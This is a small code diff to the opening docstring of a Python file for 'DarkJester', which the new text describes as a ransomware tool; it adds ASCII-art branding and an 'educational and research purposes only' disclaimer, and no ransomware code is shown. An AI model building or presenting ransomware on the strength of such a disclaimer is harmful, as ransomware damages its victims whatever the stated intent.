@@ -1,5 +1,15 @@
 """
-Disclaimer: DarkJester is intended solely for ethical and legitimate uses. We are not responsible for any malicious activities or unlawful actions that occur as a result of using DarkJester. It is your responsibility to ensure that the tool is used in compliance with all applicable laws and regulations. Misuse of DarkJester for harmful, illegal, or unauthorized purposes is strictly prohibited and will be at your own risk.
+________                __        ____.                __                
+\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
+ |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
+ |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
+/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
+        \/     \/           \/             \/     \/            \/       
+Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
+Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
+Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
+This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
+Always act responsibly and ethically when working with this kind tool.
 """
 import os
 import sys
